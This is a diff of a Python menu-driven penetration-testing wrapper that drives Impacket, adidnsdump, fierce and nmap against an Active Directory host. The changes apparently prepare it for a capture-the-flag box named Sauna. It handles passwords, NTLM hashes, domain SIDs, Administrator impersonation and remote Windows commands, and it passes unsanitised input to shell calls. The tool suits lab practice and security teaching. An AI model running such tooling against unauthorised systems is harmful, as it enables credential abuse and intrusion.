@@ -9,7 +9,7 @@
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0                                                                
+# Version : Sauna                                                                
 # Details : Load required imports.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -29,7 +29,7 @@ from termcolor import colored					# pip install termcolor
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : 1.0                                                                
+# Version : Sauna                                                                
 # Details : Conduct simple and routine tests on user supplied arguements.   
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -49,7 +49,7 @@ BUG = 0			# BUGHUNT ON/OFF
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : 1.0
+# Version : Sauna
 # Details : Create function calls from main.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -59,13 +59,6 @@ def padding(variable,value):
    variable = variable[:value] 
    while len(variable) < value:
       variable += " "
-   return variable
-
-def rpadding(variable,value):
-   variable = variable.rstrip("\n")
-   while len(variable) < value:
-      temp = variable
-      variable = "." + temp
    return variable
 
 def dpadding(variable,value):
@@ -102,12 +95,11 @@ def display():
    print('\u2554' + ('\u2550')*36 + '\u2566' + ('\u2550')*33 + '\u2566' + ('\u2550')*61 + '\u2557')
    print('\u2551' + (" ")*12 + colored("REMOTE SYSTEM",'white') +  (" ")*11 + '\u2551' + (" ")*10 + colored("SYSTEM SHARES",'white') + (" ")*10 + '\u2551' + (" ")*21 +  colored("USER INFORMATION",'white') + (" ")*24 + '\u2551') 
    print('\u2560' + ('\u2550')*14 + '\u2564' + ('\u2550')*21 + '\u256C' + ('\u2550')*12 + '\u2550' + ('\u2550')*20 + '\u256C' + ('\u2550')*61 + '\u2563')
-
    print('\u2551' + " DNS SERVER   " + '\u2502', end=' ')
-   if DNSN == "EMPTY              ":
-      print(colored(DNSN[:COL1],'yellow'), end=' ')
+   if DNS == "EMPTY              ":
+      print(colored(DNS[:COL1],'yellow'), end=' ')
    else:
-      print(colored(DNSN[:COL1],'blue'), end=' ')
+      print(colored(DNS[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(SH0,'blue'), end=' ')
    print(colored(SHA0,'blue'), end=' ')
@@ -115,7 +107,6 @@ def display():
    print(colored(US[0],'blue'), end=' ')
    print(colored(PA[0],'blue'), end=' ')
    print('\u2551')
-
    print('\u2551' + " REMOTE IP    " + '\u2502', end=' ')
    if TIP == "EMPTY              ":
       print(colored(TIP[:COL1],'yellow'), end=' ')
@@ -128,9 +119,8 @@ def display():
    print(colored(US[1],'blue'), end=' ')
    print(colored(PA[1],'blue'), end=' ')
    print('\u2551')
-
    print('\u2551' + " USERNAME     " + '\u2502', end=' ')
-   if USR == '""                 ':
+   if USR[:2] == '""':
       print(colored(USR[:COL1],'yellow'), end=' ')
    else:
       print(colored(USR[:COL1],'blue'), end=' ')
@@ -141,9 +131,8 @@ def display():
    print(colored(US[2],'blue'), end=' ')
    print(colored(PA[2],'blue'), end=' ')
    print('\u2551')
-   
    print('\u2551' + " PASSWORD     " + '\u2502', end=' ')
-   if PAS == '""                 ':
+   if PAS[:2] == '""':
       print(colored(PAS[:COL1],'yellow'), end=' ')
    else:
       print(colored(PAS[:COL1],'blue'), end=' ')
@@ -154,25 +143,23 @@ def display():
    print(colored(US[3],'blue'), end=' ')
    print(colored(PA[3],'blue'), end=' ')
    print('\u2551')
-
    print('\u2551' + " NTLM HASH    " + '\u2502', end=' ')
-   if FRST == "EMPTY              ":
-      print(colored(FRST[:COL1],'yellow'), end=' ')
+   if NTLM == "EMPTY              ":
+      print(colored(NTLM[:COL1],'yellow'), end=' ')
    else:
-      print(colored(FRST[:COL1],'red'), end=' ')
+      print(colored(NTLM[:COL1],'red'), end=' ')
    print('\u2551', end=' ')
    print(colored(SH4,'blue'), end=' ')
    print(colored(SHA4,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[4],'blue'), end=' ')
    print(colored(PA[4],'blue'), end=' ')
-   print('\u2551')
-   
+   print('\u2551')   
    print('\u2551' + " DOMAIN NAME  " + '\u2502', end=' ')
-   if HST == "EMPTY              ":
-      print(colored(HST[:COL1],'yellow'), end=' ')
+   if DOM == "EMPTY              ":
+      print(colored(DOM[:COL1],'yellow'), end=' ')
    else:
-      print(colored(HST[:COL1],'blue'), end=' ')
+      print(colored(DOM[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(SH5,'blue'), end=' ')
    print(colored(SHA5,'blue'), end=' ')
@@ -180,51 +167,47 @@ def display():
    print(colored(US[5],'blue'), end=' ')
    print(colored(PA[5],'blue'), end=' ')
    print('\u2551')
-
    print('\u2551' + " DOMAIN SID   " + '\u2502', end=' ')
-   if WGRP == "EMPTY              ":
-      print(colored(WGRP[:COL1],'yellow'), end=' ')
+   if DOMS == "EMPTY              ":
+      print(colored(DOMS[:COL1],'yellow'), end=' ')
    else:
-      print(colored(WGRP[:COL1],'red'), end=' ')
+      print(colored(DOMS[:COL1],'red'), end=' ')
    print('\u2551', end=' ')
    print(colored(SH6,'blue'), end=' ')
    print(colored(SHA6,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[6],'blue'), end=' ')
    print(colored(PA[6],'blue'), end=' ')
-   print('\u2551')
-     
+   print('\u2551')     
    print('\u2551' + " SHARE NAME   " + '\u2502', end=' ')
-   if HIP == "EMPTY              ":
-      print(colored(HIP[:COL1],'yellow'), end=' ')
+   if TSH == "EMPTY              ":
+      print(colored(TSH[:COL1],'yellow'), end=' ')
    else:
-      print(colored(HIP[:COL1],'blue'), end=' ')
+      print(colored(TSH[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(SH7,'blue'), end=' ')
    print(colored(SHA7,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[7],'blue'), end=' ')
    print(colored(PA[7],'blue'), end=' ')
-   print('\u2551')
-   
+   print('\u2551')   
    print('\u2551' + " IMPERSONATE  " + '\u2502', end=' ')
-   if POR == "Administrator      ":
-      print(colored(POR[:COL1],'yellow'), end=' ')
+   if IMP == "Administrator      ":
+      print(colored(IMP[:COL1],'yellow'), end=' ')
    else:
-      print(colored(POR[:COL1],'blue'), end=' ')
+      print(colored(IMP[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(SH8,'blue'), end=' ')
    print(colored(SHA8,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[8],'blue'), end=' ')
    print(colored(PA[8],'blue'), end=' ')
-   print('\u2551')
-      
+   print('\u2551')      
    print('\u2551' + " WIN COMMAND  " + '\u2502', end=' ')
-   if PRM == "'dir -FORCE'       ":
-      print(colored(PRM[:COL1],'yellow'), end=' ')
+   if WCOM == "'dir -FORCE'       ":
+      print(colored(WCOM[:COL1],'yellow'), end=' ')
    else:
-      print(colored(PRM[:COL1],'blue'), end=' ')
+      print(colored(WCOM[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(SH9,'blue'), end=' ')
    print(colored(SHA9,'blue'), end=' ')
@@ -232,20 +215,18 @@ def display():
    print(colored(US[9],'blue'), end=' ')
    print(colored(PA[9],'blue'), end=' ')
    print('\u2551')
-
    print('\u2551' + " CURRENT TIME " + '\u2502', end=' ')
    if SKEW == 0:
-      print(colored(PI1[:COL1],'yellow'), end=' ')
+      print(colored(LTM[:COL1],'yellow'), end=' ')
    else:
-      print(colored(PI1[:COL1],'blue'), end=' ')
+      print(colored(LTM[:COL1],'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(SH10,'blue'), end=' ')
    print(colored(SHA10,'blue'), end=' ')
    print('\u2551', end=' ')
    print(colored(US[10],'blue'), end=' ')
    print(colored(PA[10],'blue'), end=' ')
-   print('\u2551')
-   
+   print('\u2551')   
    print('\u2551' + " MY DIRECTORY " + '\u2502', end=' ')
    if DIR == "WORKAREA           ":
       print(colored(DIR[:COL1],'yellow'), end=' ')
@@ -261,7 +242,6 @@ def display():
       print(colored(US[11],'blue'), end=' ')
    print(colored(PA[11],'blue'), end=' ')
    print('\u2551')
-
    print('\u2560' + ('\u2550')*14 + '\u2567'+ ('\u2550')*21  + '\u2569' + ('\u2550')*12 + '\u2550' + ('\u2550')*20 + '\u2569' + ('\u2550')*61 + '\u2563')
 
 # ----------------------------------------------------------------------------------------------------------------------------------------------------
@@ -281,7 +261,7 @@ def display():
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence BroadbentAdres                                                    
 # CONTRACT: GitHub
-# Version : 1.0                                                                
+# Version : Sauna                                                                
 # Details : Display universal header.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
@@ -298,38 +278,38 @@ print("BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS\n")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : 1.0
+# Version : Sauna
 # Details : Boot the system and initialise program files and variables.
 # Modified: N/A                                                               
 # -------------------------------------------------------------------------------------
 
 print("[+] Booting - Please wait...\n")
 
-if not os.path.exists("WORKAREA"):		# DEFUALT WORKAREA
+if not os.path.exists("WORKAREA"):			# DEFAULT WORKAREA
    os.mkdir("WORKAREA")
    print("[-] Work area created...")
 else:
    print("[-] Work area already exists...")
 
-if not os.path.exists("USERS.tmp"):		# HOLDS INITIAL USERS DATA
+if not os.path.exists("USERS.tmp"):			# HOLDS INITIAL USERS DATA
    command("touch USERS.tmp")
    print("[-] File USERS.tmp created...")
 else:
    print("[-] File USERS.tmp already exists...")
 
-if not os.path.exists("users.txt"):		# HOLDS CURRENT FILTERED USER LIST
+if not os.path.exists("users.txt"):			# HOLDS CURRENT FILTERED USER LIST
    command("touch users.txt")
    print("[-] File users.txt created...")
 else:
    print("[-] File users.txt already exists...")
 
-if not os.path.exists("SHARES.tmp"):		# HOLDS INITIAL SHARE DATA
+if not os.path.exists("SHARES.tmp"):			# HOLDS INITIAL SHARE DATA
    command("touch SHARES.tmp")
    print("[-] File SHARES.tmp created...")
 else:
    print("[-] File SHARES.tmp already exists...")
 
-if not os.path.exists("SECRETS.tmp"):		# HOLDS INITIAL SECRETS DATA
+if not os.path.exists("SECRETS.tmp"):			# HOLDS INITIAL SECRETS DATA
    command("touch SECRETS.tmp")
    print("[-] File SECRETS.tmp created...")
 else:
@@ -337,42 +317,40 @@ else:
 
 print("[-] Populating system variables...")
 
-COL1 = 19
-COL2 = 31	
-COL3 = 26	# USER
-COL4 = 32	# PASSWORD
-COL5 = 15	# SHARE
+COL1 = 19	 # SESSION
+COL2 = 15	 # SHARE
+COL3 = 26	 # USERNAME
+COL4 = 32	 # PASSWORD
+SKEW = 0         # TIME
+MAX  = 39	 # 0 - 39
 
-PRO  = "/usr/share/doc/python3-impacket/examples/" # IMPACKET LOCATION
-LIP  = "10.10.10.xxx       " # LOCAL IP
-SKEW = 0                     # TIME ADJUSTED
+PATH = "/usr/share/doc/python3-impacket/examples/" 	# IMPACKET LOCATION
 
-SH0  = " "*COL5 # SHARE
-SH1  = " "*COL5 # SHARE 
-SH2  = " "*COL5 # SHARE
-SH3  = " "*COL5 # SHARE
-SH4  = " "*COL5 # SHARE
-SH5  = " "*COL5 # SHARE
-SH6  = " "*COL5 # SHARE
-SH7  = " "*COL5 # SHARE
-SH8  = " "*COL5 # SHARE
-SH9  = " "*COL5 # SHARE
-SH10 = " "*COL5 # SHARE 
-SH11 = " "*COL5 # SHARE
+SH0  = " "*COL2  # SHARE
+SH1  = " "*COL2  # SHARE 
+SH2  = " "*COL2  # SHARE
+SH3  = " "*COL2  # SHARE
+SH4  = " "*COL2  # SHARE
+SH5  = " "*COL2  # SHARE
+SH6  = " "*COL2  # SHARE
+SH7  = " "*COL2  # SHARE
+SH8  = " "*COL2  # SHARE
+SH9  = " "*COL2  # SHARE
+SH10 = " "*COL2  # SHARE 
+SH11 = " "*COL2  # SHARE
 
-SHA0  = " "*COL5 # SHARE ATTRIBUTE
-SHA1  = " "*COL5 # SHARE ATTRIBUTE
-SHA2  = " "*COL5 # SHARE ATTRIBUTE
-SHA3  = " "*COL5 # SHARE ATTRIBUTE
-SHA4  = " "*COL5 # SHARE ATTRIBUTE
-SHA5  = " "*COL5 # SHARE ATTRIBUTE
-SHA6  = " "*COL5 # SHARE ATTRIBUTE
-SHA7  = " "*COL5 # SHARE ATTRIBUTE
-SHA8  = " "*COL5 # SHARE ATTRIBUTE
-SHA9  = " "*COL5 # SHARE ATTRIBUTE
-SHA10 = " "*COL5 # SHARE ATTRIBUTE
-SHA11 = " "*COL5 # SHARE ATTRIBUTE
-
+SHA0  = " "*COL2 # SHARE ATTRIBUTE
+SHA1  = " "*COL2 # SHARE ATTRIBUTE
+SHA2  = " "*COL2 # SHARE ATTRIBUTE
+SHA3  = " "*COL2 # SHARE ATTRIBUTE
+SHA4  = " "*COL2 # SHARE ATTRIBUTE
+SHA5  = " "*COL2 # SHARE ATTRIBUTE
+SHA6  = " "*COL2 # SHARE ATTRIBUTE
+SHA7  = " "*COL2 # SHARE ATTRIBUTE
+SHA8  = " "*COL2 # SHARE ATTRIBUTE
+SHA9  = " "*COL2 # SHARE ATTRIBUTE
+SHA10 = " "*COL2 # SHARE ATTRIBUTE
+SHA11 = " "*COL2 # SHARE ATTRIBUTE
 
 X1   = " "*COL3
 X2   = " "*COL4
@@ -381,67 +359,63 @@ PA   = []
 US   = [X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1,X1] # 40 USERNAMES
 PA   = [X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2,X2] # 40 PASSWORDS
 
-MAX  = 39
-ADD  = 0
-ADD2 = 0
-
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : 1.0
+# Version : Sauna
 # Details : Check the config file for stored variables.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
 if not os.path.exists('config.txt'):
    print("[-] Configuration file not found - using defualt values...")
-   DNSN = "EMPTY              " # DNS NAME
+   DNS  = "EMPTY              " # DNS NAME
    TIP  = "EMPTY              " # REMOTE IP
    USR  = '""                 ' # USERNAME
    PAS  = '""                 ' # PASSWORD       
-   FRST = "EMPTY              " # NTML HASH
-   HST  = "EMPTY              " # DOMAIN NAME
-   WGRP = "EMPTY              " # DOMAIN SID
-   HIP  = "EMPTY              " # CURRENT SHARE
-   POR  = "Administrator      " # IMPERSONATE
-   PRM  = "'dir -FORCE'       " # WIN COMMAND                                            
-   PI1  = "00:00              " # LOCAL TIME    
+   NTLM = "EMPTY              " # NTLM HASH
+   DOM  = "EMPTY              " # DOMAIN NAME
+   DOMS = "EMPTY              " # DOMAIN SID
+   TSH  = "EMPTY              " # CURRENT SHARE
+   IMP  = "Administrator      " # IMPERSONATE
+   WCOM = "'dir -FORCE'       " # WIN COMMAND                                            
+   LTM  = "00:00              " # LOCAL TIME    
    DIR  = "WORKAREA           " # DIRECTORY
 else:
    print("[-] Configuration file found - restoring saved data....")
-   DNSN = linecache.getline('config.txt', 1)
+   DNS  = linecache.getline('config.txt', 1)
    TIP  = linecache.getline('config.txt', 2)
    USR  = linecache.getline('config.txt', 3)
    PAS  = linecache.getline('config.txt', 4)
-   FRST = linecache.getline('config.txt', 5)
-   HST  = linecache.getline('config.txt', 6)
-   WGRP = linecache.getline('config.txt', 7)
-   HIP  = linecache.getline('config.txt', 8)
-   POR  = linecache.getline('config.txt', 9)
-   PRM  = linecache.getline('config.txt', 10)
-   PI1  = linecache.getline('config.txt', 11)
+   NTLM = linecache.getline('config.txt', 5)
+   DOM  = linecache.getline('config.txt', 6)
+   DOMS = linecache.getline('config.txt', 7)
+   TSH  = linecache.getline('config.txt', 8)
+   IMP  = linecache.getline('config.txt', 9)
+   WCOM = linecache.getline('config.txt', 10)
+   LTM  = linecache.getline('config.txt', 11)
    DIR  = linecache.getline('config.txt', 12)
 
-   DNSN = padding(DNSN, COL1)
+   DNS = padding(DNS, COL1)
    TIP  = padding(TIP,  COL1)
    USR  = padding(USR,  COL1)
    PAS  = padding(PAS,  COL4)
-   if FRST[:5] == "EMPTY":
-      FRST = padding(FRST, COL1)
-   HST  = padding(HST,  COL1)
-   if WGRP[:5] == "EMPTY":
-       WGRP = padding(WGRP, COL1)
-   HIP  = padding(HIP,  COL1)
-   POR  = padding(POR,  COL1)
-   PRM  = padding(PRM,  COL1)
-   PI1  = padding(PI1,  COL1)
+   if NTLM[:5] == "EMPTY":
+      NTLM = padding(NTLM, COL1)
+   DOM  = padding(DOM,  COL1)
+   if DOMS[:5] == "EMPTY":
+       DOMS = padding(DOMS, COL1)
+   TSH  = padding(TSH,  COL1)
+   IMP  = padding(IMP,  COL1)
+   WCOM  = padding(WCOM,  COL1)
+   LTM  = padding(LTM,  COL1)
    DIR  = padding(DIR,  COL1)
 
 print("[*] Starting neo4j database...")
 
 command("touch log.txt")
 command("neo4j start   >> log.txt 2>&1")
-command("neo4j console >> log.txt 2>&1")
+# command("neo4j console >> log.txt 2>&1")
 os.remove("log.txt")
 
 input("\nPlease ENTER key to continue...")
@@ -449,27 +423,27 @@ input("\nPlease ENTER key to continue...")
 # -------------------------------------------------------------------------------------
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub                                                               
-# Version : 1.0
+# Version : Sauna
 # Details : Start the main menu controller.
 # Modified: N/A                                                               	
 # -------------------------------------------------------------------------------------
 
 while True: 
    command("clear")
-   PI1 = gettime(COL1)
+   LTM = gettime(COL1)
    display()
    selection=input("Please Select: ")
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Save current data to config.txt and exit the program.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '0':
-      command("echo " + DNSN + " > config.txt")
+      command("echo " + DNS + " > config.txt")
       command("echo " + TIP  + " >> config.txt")
       if USR.rstrip(" ") == "\"\"":
          command("echo '\"\"' >> config.txt")
@@ -479,50 +453,46 @@ while True:
       if PAS.rstrip(" ") == "\"\"":
          command("echo '\"\"' >> config.txt")
       else:
-         command("echo " + PAS  + " >> config.txt")
-      
-      command("echo " + FRST.rstrip("\n") + " >> config.txt") # CURRENT PASSWORD
-      
-      command("echo " + HST  + " >> config.txt")  
-      command("echo " + WGRP.rstrip("\n") + " >> config.txt")
-      command("echo " + HIP  + " >> config.txt")  
-      command("echo " + POR  + " >> config.txt")  
-      tmp = '\"' + PRM.rstrip(" ") + '\"'
+         command("echo " + PAS  + " >> config.txt")      
+      command("echo " + NTLM.rstrip("\n") + " >> config.txt")
+      command("echo " + DOM  + " >> config.txt")  
+      command("echo " + DOMS.rstrip("\n") + " >> config.txt")
+      command("echo " + TSH  + " >> config.txt")  
+      command("echo " + IMP  + " >> config.txt")  
+      tmp = '\"' + WCOM.rstrip(" ") + '\"'
       command("echo " + tmp + " >> config.txt")  
-      command("echo " + PI1  + " >> config.txt")  
-      command("echo " + DIR  + " >> config.txt")  
-      
+      command("echo " + LTM  + " >> config.txt")  
+      command("echo " + DIR  + " >> config.txt")        
       os.remove("SECRETS.tmp")
       os.remove("SHARES.tmp")
       os.remove("USERS.tmp")
       os.remove("users.txt")
-
       exit(1)
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change remote DNS SERVER name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection =='1':
-      BAK = DNSN
-      DNSN = input("\nPlease enter DNS SERVER name: ")
-      if DNSN != "":
-         if len(DNSN) < COL1:
-            DNSN = padding(DNSN, COL1)
-         command("echo '" + TIP.rstrip(" ") + "\t" + DNSN.rstrip(" ") + "' >> /etc/hosts")
-         print("DNS SERVER " + DNSN.rstrip(" ") + " has been added to /etc/hosts...")
+      BAK = DNS
+      DNS = input("\nPlease enter DNS SERVER name: ")
+      if DNS != "":
+         if len(DNS) < COL1:
+            DNS = padding(DNS, COL1)
+         command("echo '" + TIP.rstrip(" ") + "\t" + DNS.rstrip(" ") + "' >> /etc/hosts")
+         print("DNS SERVER " + DNS.rstrip(" ") + " has been added to /etc/hosts...")
          prompt()
       else:
-         DNSN = BAK      
+         DNS = BAK      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change remote IP address.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -539,7 +509,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change the current USER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -552,14 +522,14 @@ while True:
             USR = padding(USR, COL1)
          for a in range(0, MAX):
             if US[a].rstrip(" ") == USR.rstrip(" "):
-               FRST = PA[a]	# UPDATE HASH VALUE TO MATCH USER.
+               NTLM = PA[a]	# UPDATE HASH VALUE TO MATCH USER.
       else:
          USR = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change the current USERS PASSWORD.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -576,130 +546,130 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change the current USERS HASH value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '5':
-      BAK = FRST
-      FRST = input("\nPlease enter HASH value: ")
-      if FRST != "":
-         if len(FRST) < COL1:
-            FRST = padding(FRST, COL1)
+      BAK = NTLM
+      NTLM = input("\nPlease enter HASH value: ")
+      if NTLM != "":
+         if len(NTLM) < COL1:
+            NTLM = padding(NTLM, COL1)
       else:
-         FRST = BAK
+         NTLM = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change the remote DOMAIN name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '6':
-      BAK = HST
-      HST = input("\nPlease enter DOMAIN name: ")
-      if HST != "":
-         if len(HST) < COL1:
-            HST = padding(HST, COL1)
-         command("echo '" + TIP.rstrip(" ") + "\t" + HST.rstrip(" ") + "' >> /etc/hosts")
-         print("DOMAIN " + HST.rstrip(" ") + " has been added to /etc/hosts...")
+      BAK = DOM
+      DOM = input("\nPlease enter DOMAIN name: ")
+      if DOM != "":
+         if len(DOM) < COL1:
+            DOM = padding(DOM, COL1)
+         command("echo '" + TIP.rstrip(" ") + "\t" + DOM.rstrip(" ") + "' >> /etc/hosts")
+         print("DOMAIN " + DOM.rstrip(" ") + " has been added to /etc/hosts...")
          prompt()
       else:
-         HST = BAK      
+         DOM = BAK      
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change the remote DOMAIN SID value.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '7':
-      BAK = WGRP
-      WGRP = input("\nPlease enter DOMAIN SID value: ")
-      if WGRP != "":
-         if len(WGRP) < COL1:
-            WGRP = padding(WGRP, COL1)
+      BAK = DOMS
+      DOMS = input("\nPlease enter DOMAIN SID value: ")
+      if DOMS != "":
+         if len(DOMS) < COL1:
+            DOMS = padding(DOMS, COL1)
       else:
-         WGRP = BAK
+         DOMS = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change the remote SHARE name.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '8':
-      BAK = HIP
-      HIP = input("\nPlease enter SHARE name: ")
-      if HIP != "":
-         if len(HIP) < COL1:
-            HIP = padding(HIP,COL1)
+      BAK = TSH
+      TSH = input("\nPlease enter SHARE name: ")
+      if TSH != "":
+         if len(TSH) < COL1:
+            TSH = padding(TSH,COL1)
       else:
-         HIP = BAK
+         TSH = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change the remote Windows USER to impersonate.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '9':
-      BAK = POR
-      POR = input("\nPlease enter IMPERSONATOR name: ")
-      if POR != "":
-         if len(POR) < COL1:
-            POR = padding(POR, COL1)
+      BAK = IMP
+      IMP = input("\nPlease enter IMPERSONATOR name: ")
+      if IMP != "":
+         if len(IMP) < COL1:
+            IMP = padding(IMP, COL1)
       else:
-         POR = BAK
+         IMP = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change the remote windows COMMAND.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '10':
-      BAK = PRM
-      PRM = input("\nPlease enter Windows COMMAND: ")
-      if PRM != "":
-         if len(PRM) < COL1:
-            PRM = padding(PRM, COL1)
+      BAK = WCOM
+      WCOM = input("\nPlease enter Windows COMMAND: ")
+      if WCOM != "":
+         if len(WCOM) < COL1:
+            WCOM = padding(WCOM, COL1)
       else:
-         PRM = BAK
+         WCOM = BAK
 
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                           
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Reset local TIME to match kerberos skew. 
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '11':
-      BAK = PI1
-      PI1 = input("\nPlease enter computer TIME: ")
-      if PI1 != "":
-         command("date --set=" + PI1)
-         PI1 = padding(PI1, COL1)
+      BAK = LTM
+      LTM = input("\nPlease enter computer TIME: ")
+      if LTM != "":
+         command("date --set=" + LTM)
+         LTM = padding(LTM, COL1)
          SKEW = 1
       else:
-         PI1 = BAK      
+         LTM = BAK      
       
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Change local working DIRECTORY.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -720,7 +690,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - Ping localhost IP.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
@@ -732,7 +702,7 @@ while True:
          os.remove("localip.txt")
          localhost = localhost.split(" ")
          localhost = localhost[1]
-         command(PRO + "ping.py " + localhost.rstrip(" ") +  " " + TIP.rstrip(" "))
+         command(PATH + "ping.py " + localhost.rstrip(" ") +  " " + TIP.rstrip(" "))
       else:
          print("Remote IP address not specified...")
       prompt()
@@ -740,20 +710,20 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - adidnsdump -u DOMAIN\USER -p PASSWORD DOMAIN --include-tombstoned -r
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '14':
-      if (HST[:5] == "EMPTY"):
+      if (DOM[:5] == "EMPTY"):
          print("Domain name not specified...")
       if (USR[:2] == '""'):
          print("User name not specified...")
       if (PAS[:2] == '""'): 
          print("Password not specified...")
       else:
-         command("adidnsdump -u '" + HST.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + HST.rstrip(" ") + " --include-tombstoned -r")
+         command("adidnsdump -u '" + DOM.rstrip(" ") + "\\" + USR.rstrip(" ") + "' -p " + PAS.rstrip(" ") + " " + DOM.rstrip(" ") + " --include-tombstoned -r")
          command("sed -i '1d' records.csv")
          command("\ncat records.csv")
       prompt()
@@ -761,14 +731,14 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - fierce -dns DNS SERVER.
 # Modified: N/A
 # -------------------------------------------------------------------------------------
 
    if selection == '15':
-      if DNSN[:5] != "EMPTY":
-         command("fierce -dns " + DNSN.rstrip(" "))
+      if DNS[:5] != "EMPTY":
+         command("fierce -dns " + DNS.rstrip(" "))
       else:
          print("DNS Server not specified...")
       prompt()
@@ -776,7 +746,7 @@ while True:
 # ------------------------------------------------------------------------------------- 
 # AUTHOR  : Terence Broadbent                                                    
 # CONTRACT: GitHub
-# Version : 1.0
+# Version : Sauna
 # Details : Menu option selected - nmap -sU -O -p 123 --script ntp-info IP.
 # Modified: N/A
